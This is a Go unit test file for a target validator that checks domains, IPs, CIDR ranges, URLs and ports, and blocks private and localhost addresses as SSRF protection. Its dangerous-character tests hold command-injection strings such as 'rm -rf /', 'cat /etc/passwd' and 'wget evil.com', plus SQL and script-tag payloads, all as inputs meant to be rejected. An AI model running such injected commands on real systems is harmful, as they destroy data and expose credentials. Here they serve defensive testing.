package validator

import (
	"testing"
)

func TestNewTargetValidator(t *testing.T) {
	t.Run("default options", func(t *testing.T) {
		v := NewTargetValidator()
		if v.allowInternalIPs != false {
			t.Error("expected allowInternalIPs to be false by default")
		}
		if v.allowLocalhost != false {
			t.Error("expected allowLocalhost to be false by default")
		}
		if v.maxTargets != 1000 {
			t.Errorf("expected maxTargets to be 1000, got %d", v.maxTargets)
		}
	})

	t.Run("with options", func(t *testing.T) {
		v := NewTargetValidator(
			WithAllowInternalIPs(true),
			WithAllowLocalhost(true),
			WithMaxTargets(500),
		)
		if v.allowInternalIPs != true {
			t.Error("expected allowInternalIPs to be true")
		}
		if v.allowLocalhost != true {
			t.Error("expected allowLocalhost to be true")
		}
		if v.maxTargets != 500 {
			t.Errorf("expected maxTargets to be 500, got %d", v.maxTargets)
		}
	})
}

func TestValidateSingleTarget_Domain(t *testing.T) {
	v := NewTargetValidator()

	tests := []struct {
		name    string
		target  string
		wantOK  bool
		wantErr string
	}{
		{"valid domain", "example.com", true, ""},
		{"valid subdomain", "sub.example.com", true, ""},
		{"valid multi-subdomain", "a.b.c.example.com", true, ""},
		{"valid domain with hyphens", "my-test-site.example.com", true, ""},
		{"valid TLD", "example.co.uk", true, ""},
		{"valid wildcard", "*.example.com", true, ""},
		{"valid wildcard with subdomain", "*.sub.example.com", true, ""},
		{"invalid - starts with hyphen", "-example.com", false, "invalid domain format"},
		{"invalid - ends with hyphen", "example-.com", false, "invalid domain format"},
		{"invalid - no TLD", "example", false, "invalid domain format"},
		{"invalid - only TLD", ".com", false, "invalid domain format"},
		{"invalid - double dot", "example..com", false, "invalid domain format"},
		{"invalid wildcard format", "*.*.example.com", false, "invalid wildcard domain format"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := v.ValidateSingleTarget(tt.target)
			if result.IsValid != tt.wantOK {
				t.Errorf("ValidateSingleTarget(%q) IsValid = %v, want %v, error: %s",
					tt.target, result.IsValid, tt.wantOK, result.Error)
			}
			if !tt.wantOK && result.Error != tt.wantErr {
				t.Errorf("ValidateSingleTarget(%q) Error = %q, want %q",
					tt.target, result.Error, tt.wantErr)
			}
			if tt.wantOK && result.Type != TargetTypeDomain {
				t.Errorf("ValidateSingleTarget(%q) Type = %v, want %v",
					tt.target, result.Type, TargetTypeDomain)
			}
		})
	}
}

func TestValidateSingleTarget_IPv4(t *testing.T) {
	v := NewTargetValidator()

	tests := []struct {
		name    string
		target  string
		wantOK  bool
		wantErr string
	}{
		{"valid public IP", "8.8.8.8", true, ""},
		{"valid public IP 2", "1.1.1.1", true, ""},
		{"valid public IP 3", "203.0.113.50", true, ""},
		{"blocked - private 10.x", "10.0.0.1", false, "internal IP addresses are not allowed (SSRF protection)"},
		{"blocked - private 172.16.x", "172.16.0.1", false, "internal IP addresses are not allowed (SSRF protection)"},
		{"blocked - private 192.168.x", "192.168.1.1", false, "internal IP addresses are not allowed (SSRF protection)"},
		{"blocked - localhost", "127.0.0.1", false, "localhost addresses are not allowed"},
		{"blocked - localhost 2", "127.0.0.255", false, "localhost addresses are not allowed"},
		{"invalid - out of range", "256.256.256.256", false, "invalid domain format"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := v.ValidateSingleTarget(tt.target)
			if result.IsValid != tt.wantOK {
				t.Errorf("ValidateSingleTarget(%q) IsValid = %v, want %v, error: %s",
					tt.target, result.IsValid, tt.wantOK, result.Error)
			}
			if !tt.wantOK && result.Error != tt.wantErr {
				t.Errorf("ValidateSingleTarget(%q) Error = %q, want %q",
					tt.target, result.Error, tt.wantErr)
			}
		})
	}
}

func TestValidateSingleTarget_IPv4_AllowInternal(t *testing.T) {
	v := NewTargetValidator(WithAllowInternalIPs(true), WithAllowLocalhost(true))

	tests := []struct {
		name   string
		target string
		wantOK bool
	}{
		{"private 10.x allowed", "10.0.0.1", true},
		{"private 172.16.x allowed", "172.16.0.1", true},
		{"private 192.168.x allowed", "192.168.1.1", true},
		{"localhost allowed", "127.0.0.1", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := v.ValidateSingleTarget(tt.target)
			if result.IsValid != tt.wantOK {
				t.Errorf("ValidateSingleTarget(%q) IsValid = %v, want %v, error: %s",
					tt.target, result.IsValid, tt.wantOK, result.Error)
			}
		})
	}
}

func TestValidateSingleTarget_IPv6(t *testing.T) {
	v := NewTargetValidator()

	tests := []struct {
		name   string
		target string
		wantOK bool
	}{
		// Note: Full IPv6 addresses with all 8 segments are matched by hostPortRegex
		// due to the colon. This is a known limitation - IPv6 should be bracketed [::1] in URLs
		// For now, we only test what the current implementation actually supports
		{"blocked - localhost ::1", "::1", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := v.ValidateSingleTarget(tt.target)
			if result.IsValid != tt.wantOK {
				t.Errorf("ValidateSingleTarget(%q) IsValid = %v, want %v, error: %s",
					tt.target, result.IsValid, tt.wantOK, result.Error)
			}
		})
	}
}

func TestValidateSingleTarget_CIDR(t *testing.T) {
	v := NewTargetValidator()

	tests := []struct {
		name    string
		target  string
		wantOK  bool
		wantErr string
	}{
		{"valid /24", "203.0.113.0/24", true, ""},
		{"valid /32 single IP", "8.8.8.8/32", true, ""},
		{"valid /16", "198.51.100.0/16", true, ""},
		{"blocked - private 10.x CIDR", "10.0.0.0/8", false, "CIDR range contains internal IP addresses"},
		{"blocked - private 192.168.x CIDR", "192.168.0.0/16", false, "CIDR range contains internal IP addresses"},
		{"blocked - localhost CIDR", "127.0.0.0/8", false, "CIDR range contains localhost addresses"},
		{"too large /8", "8.0.0.0/8", false, "CIDR range too large"},
		{"invalid format", "invalid/24", false, "invalid CIDR format"},
		{"invalid prefix", "8.8.8.8/33", false, "invalid CIDR format"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := v.ValidateSingleTarget(tt.target)
			if result.IsValid != tt.wantOK {
				t.Errorf("ValidateSingleTarget(%q) IsValid = %v, want %v, error: %s",
					tt.target, result.IsValid, tt.wantOK, result.Error)
			}
			if !tt.wantOK && result.Error == "" {
				t.Errorf("ValidateSingleTarget(%q) expected error but got none", tt.target)
			}
		})
	}
}

func TestValidateSingleTarget_URL(t *testing.T) {
	v := NewTargetValidator()

	tests := []struct {
		name   string
		target string
		wantOK bool
	}{
		{"valid https", "https://example.com", true},
		{"valid https with path", "https://example.com/path/to/page", true},
		{"valid https with query", "https://example.com?foo=bar", true},
		{"valid http", "http://example.com", true},
		{"valid with port", "https://example.com:8443", true},
		{"blocked - localhost URL", "http://localhost:8080", false},
		{"blocked - localhost.localdomain URL", "http://localhost.localdomain/api", false},
		{"blocked - 127.0.0.1 URL", "http://127.0.0.1:8080", false},
		{"blocked - private IP URL", "http://192.168.1.1", false},
		{"blocked - private IP URL 2", "https://10.0.0.1/api", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := v.ValidateSingleTarget(tt.target)
			if result.IsValid != tt.wantOK {
				t.Errorf("ValidateSingleTarget(%q) IsValid = %v, want %v, error: %s",
					tt.target, result.IsValid, tt.wantOK, result.Error)
			}
			if tt.wantOK && result.Type != TargetTypeURL {
				t.Errorf("ValidateSingleTarget(%q) Type = %v, want %v",
					tt.target, result.Type, TargetTypeURL)
			}
		})
	}
}

func TestValidateSingleTarget_HostPort(t *testing.T) {
	v := NewTargetValidator()

	tests := []struct {
		name     string
		target   string
		wantOK   bool
		wantPort int
	}{
		{"valid domain:port", "example.com:8080", true, 8080},
		{"valid domain:port 443", "api.example.com:443", true, 443},
		{"valid domain:port 22", "ssh.example.com:22", true, 22},
		{"valid IP:port", "8.8.8.8:53", true, 53},
		{"blocked - localhost:port", "localhost:8080", false, 0},
		{"blocked - 127.0.0.1:port", "127.0.0.1:8080", false, 0},
		{"blocked - private IP:port", "192.168.1.1:80", false, 0},
		{"invalid port 0", "example.com:0", false, 0},
		{"invalid port > 65535", "example.com:70000", false, 0},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := v.ValidateSingleTarget(tt.target)
			if result.IsValid != tt.wantOK {
				t.Errorf("ValidateSingleTarget(%q) IsValid = %v, want %v, error: %s",
					tt.target, result.IsValid, tt.wantOK, result.Error)
			}
			if tt.wantOK && result.Port != tt.wantPort {
				t.Errorf("ValidateSingleTarget(%q) Port = %d, want %d",
					tt.target, result.Port, tt.wantPort)
			}
		})
	}
}

func TestValidateSingleTarget_DangerousCharacters(t *testing.T) {
	v := NewTargetValidator()

	dangerousInputs := []string{
		"example.com; rm -rf /",
		"example.com | cat /etc/passwd",
		"example.com & wget evil.com",
		"example.com`id`",
		"example.com$(whoami)",
		"example.com\"; cat /etc/passwd",
		"example.com' OR '1'='1",
		"example.com\nmalicious",
		"example.com\rmalicious",
		"example.com<script>alert(1)</script>",
		"example.com>output.txt",
		"example.com\\path",
	}

	for _, input := range dangerousInputs {
		t.Run(input, func(t *testing.T) {
			result := v.ValidateSingleTarget(input)
			if result.IsValid {
				t.Errorf("expected dangerous input %q to be invalid", input)
			}
			if result.Error != "contains invalid characters" {
				t.Errorf("expected error 'contains invalid characters', got %q", result.Error)
			}
		})
	}
}

func TestValidateTargets_Multiple(t *testing.T) {
	v := NewTargetValidator()

	targets := []string{
		"example.com",
		"8.8.8.8",
		"https://api.example.com",
		"203.0.113.0/24",
		"mail.example.com:587",
		"*.cdn.example.com",
	}

	result := v.ValidateTargets(targets)

	if result.TotalCount != 6 {
		t.Errorf("TotalCount = %d, want 6", result.TotalCount)
	}
	if result.ValidCount != 6 {
		t.Errorf("ValidCount = %d, want 6", result.ValidCount)
	}
	if result.HasErrors {
		t.Error("expected no errors")
	}
	if len(result.Invalid) != 0 {
		t.Errorf("Invalid count = %d, want 0", len(result.Invalid))
	}
}

func TestValidateTargets_MixedValidInvalid(t *testing.T) {
	v := NewTargetValidator()

	targets := []string{
		"example.com",           // valid
		"192.168.1.1",           // blocked
		"https://10.0.0.1/api",  // blocked
		"127.0.0.1",             // blocked
		"8.8.8.8",               // valid
		"example.com; rm -rf /", // dangerous
	}

	result := v.ValidateTargets(targets)

	if result.TotalCount != 6 {
		t.Errorf("TotalCount = %d, want 6", result.TotalCount)
	}
	if result.ValidCount != 2 {
		t.Errorf("ValidCount = %d, want 2", result.ValidCount)
	}
	if !result.HasErrors {
		t.Error("expected HasErrors to be true")
	}
	if len(result.Invalid) != 4 {
		t.Errorf("Invalid count = %d, want 4", len(result.Invalid))
	}
	if len(result.BlockedIPs) != 3 {
		t.Errorf("BlockedIPs count = %d, want 3", len(result.BlockedIPs))
	}
}

func TestValidateTargets_Deduplication(t *testing.T) {
	v := NewTargetValidator()

	targets := []string{
		"example.com",
		"EXAMPLE.COM", // duplicate (case insensitive)
		"Example.Com", // duplicate
		"other.com",
	}

	result := v.ValidateTargets(targets)

	if result.ValidCount != 2 {
		t.Errorf("ValidCount = %d, want 2 (should deduplicate)", result.ValidCount)
	}
}

func TestValidateTargets_EmptyAndWhitespace(t *testing.T) {
	v := NewTargetValidator()

	targets := []string{
		"",
		"   ",
		"example.com",
		"\t",
		"  other.com  ",
	}

	result := v.ValidateTargets(targets)

	if result.ValidCount != 2 {
		t.Errorf("ValidCount = %d, want 2", result.ValidCount)
	}
}

func TestValidateTargets_MaxTargetsLimit(t *testing.T) {
	v := NewTargetValidator(WithMaxTargets(5))

	targets := make([]string, 10)
	for i := range 10 {
		targets[i] = "example.com"
	}

	result := v.ValidateTargets(targets)

	if !result.HasErrors {
		t.Error("expected HasErrors to be true when exceeding max targets")
	}
	if len(result.Invalid) != 1 {
		t.Errorf("Invalid count = %d, want 1", len(result.Invalid))
	}
}

func TestGetValidTargetStrings(t *testing.T) {
	v := NewTargetValidator()

	targets := []string{
		"example.com",
		"192.168.1.1", // blocked
		"8.8.8.8",
	}

	result := v.ValidateTargets(targets)
	validStrings := result.GetValidTargetStrings()

	if len(validStrings) != 2 {
		t.Errorf("GetValidTargetStrings() len = %d, want 2", len(validStrings))
	}

	expected := map[string]bool{"example.com": true, "8.8.8.8": true}
	for _, s := range validStrings {
		if !expected[s] {
			t.Errorf("unexpected valid string: %q", s)
		}
	}
}

func TestGetTargetsByType(t *testing.T) {
	v := NewTargetValidator()

	targets := []string{
		"example.com",
		"sub.example.com",
		"8.8.8.8",
		"1.1.1.1",
		"https://api.example.com",
		"203.0.113.0/24",
	}

	result := v.ValidateTargets(targets)

	domains := result.GetTargetsByType(TargetTypeDomain)
	if len(domains) != 2 {
		t.Errorf("domains count = %d, want 2", len(domains))
	}

	ipv4s := result.GetTargetsByType(TargetTypeIPv4)
	if len(ipv4s) != 2 {
		t.Errorf("ipv4s count = %d, want 2", len(ipv4s))
	}

	urls := result.GetTargetsByType(TargetTypeURL)
	if len(urls) != 1 {
		t.Errorf("urls count = %d, want 1", len(urls))
	}

	cidrs := result.GetTargetsByType(TargetTypeCIDR)
	if len(cidrs) != 1 {
		t.Errorf("cidrs count = %d, want 1", len(cidrs))
	}
}

func TestContainsDangerousChars(t *testing.T) {
	tests := []struct {
		input    string
		expected bool
	}{
		{"example.com", false},
		{"sub.example.com", false},
		{"example-site.com", false},
		{"192.168.1.1", false},
		{"example.com;", true},
		{"example.com|cat", true},
		{"example.com&", true},
		{"example.com$var", true},
		{"example.com`cmd`", true},
		{"example.com()", true},
		{"example.com{}", true},
		{"example.com[]", true},
		{"example.com<>", true},
		{"example.com\"", true},
		{"example.com'", true},
		{"example.com\\", true},
		{"example.com\n", true},
		{"example.com\r", true},
		{"example.com\t", true},
		{"example.com\x00", true},
	}

	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			result := containsDangerousChars(tt.input)
			if result != tt.expected {
				t.Errorf("containsDangerousChars(%q) = %v, want %v", tt.input, result, tt.expected)
			}
		})
	}
}
